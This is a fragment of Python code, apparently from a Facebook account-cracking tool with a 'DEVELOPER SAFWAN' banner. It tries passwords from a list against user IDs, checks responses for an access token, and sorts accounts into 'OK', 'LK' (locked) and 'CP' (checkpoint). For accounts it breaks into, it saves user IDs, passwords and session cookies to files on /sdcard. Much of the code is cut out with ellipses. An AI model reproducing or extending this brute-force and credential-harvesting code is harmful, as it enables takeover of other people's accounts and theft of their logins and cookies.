...
{G1}──────────────────────────────────────────────────
{G1}[{A}✓{G1}]{A} DEVELOPER {G1}➢{A} SAFWAN
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{G1}[SAFWAN-OK] {uid} | {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{S}[SAFWAN-LK] {uid} | {pas}');break
            elif 'www.facebook.com' in q['error']['message']:
            	print(f'\r\r{Y}[SAFWAN-CP] {uid} | {pas}');open('/sdcard/SWAG-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cp.append(ids);break
            else:continue
        loop+=1
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r{Y}[SAFWAN-CP] {ids} | {pas}')
